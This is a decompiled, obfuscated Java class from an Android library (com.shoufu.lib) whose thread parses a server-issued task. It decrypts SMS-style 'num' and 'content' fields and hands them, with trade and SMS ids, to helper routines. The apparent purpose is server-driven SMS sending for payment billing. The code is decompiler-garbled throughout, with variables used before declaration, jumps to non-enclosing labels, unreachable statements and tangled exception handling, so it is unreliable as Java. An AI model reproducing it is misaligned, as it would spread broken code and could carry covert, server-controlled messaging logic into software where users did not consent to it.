package com.shoufu.lib;

import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import com.shoufu.entity.response.Task;
import com.shoufu.entity.response.TaskData;
import com.shoufu.entity.response.TaskResultMap;
import com.shoufu.entity.response.ZzydData;
import com.shoufu.entity.response.ZzydLoginData;
import java.net.URLDecoder;
import java.util.ArrayList;
import org.json.JSONObject;

class cz
  extends Thread
{
  cz(TaskData paramTaskData, Handler paramHandler, Context paramContext) {}
  
  public void run()
  {
    Log.d("TaskUtil", "zzyd");
    int j = -1;
    try
    {
      if (this.a.getResultmap().getSuccess() == 1)
      {
        if (this.b == null) {
          break label418;
        }
        this.b.obtainMessage(8).sendToTarget();
        return;
      }
      i = this.a.getResultmap().getNextrequestcode();
      j = i;
      try
      {
        Task localTask = (Task)this.a.getResultlist().get(0);
        if (TextUtils.isEmpty(localTask.getNum().trim())) {
          break label200;
        }
        localObject1 = new JSONObject(ab.a(URLDecoder.decode(localTask.getNum().trim(), "utf-8")));
        localObject2 = new ZzydLoginData();
        z.a(localObject2, (JSONObject)localObject1);
        if (((ZzydLoginData)localObject2).getResult() == 0) {
          break label200;
        }
        if (this.b == null) {
          break label418;
        }
        this.b.obtainMessage(7, j, 0).sendToTarget();
        return;
      }
      catch (Exception localException1)
      {
        i = 0;
      }
    }
    catch (Exception localException2)
    {
      for (;;)
      {
        try
        {
          Object localObject1;
          Object localObject2;
          boolean bool;
          if (m >= localException1.getCount()) {
            continue;
          }
          if (m == 0)
          {
            ci.a(this.c, this.a.getResultmap().getTradeid(), localException1, null);
            dv.a(this.c, this.a.getResultmap().getTradeid(), localException1.getTid(), localException1.getSmsid(), 1, ((ZzydData)localObject2).getNum(), ((ZzydData)localObject2).getContent());
            i = 1;
          }
          else
          {
            dv.a(this.c, 0, ((ZzydData)localObject2).getNum(), ((ZzydData)localObject2).getContent(), null, null);
          }
        }
        catch (Exception localException3) {}
        localException2 = localException2;
        int i = 0;
        continue;
        continue;
        int k = 0;
        int n = j;
      }
    }
    localException1.printStackTrace();
    n = j;
    k = i;
    label200:
    int m;
    if ((k == 0) && (this.b != null))
    {
      this.b.obtainMessage(7, n, 0).sendToTarget();
      return;
      localObject1 = ab.a(URLDecoder.decode(localException1.getContent(), "utf-8"));
      if ((localObject1 != null) && (!"".equals(((String)localObject1).trim())))
      {
        localObject1 = new JSONObject((String)localObject1);
        localObject2 = new ZzydData();
        z.a(localObject2, (JSONObject)localObject1);
        if (!TextUtils.isEmpty(((ZzydData)localObject2).getNum()))
        {
          bool = TextUtils.isEmpty(((ZzydData)localObject2).getContent());
          if (!bool)
          {
            m = 0;
            i = 0;
          }
        }
      }
    }
    for (;;)
    {
      k = i;
      n = j;
      label418:
      return;
      m += 1;
    }
  }
}
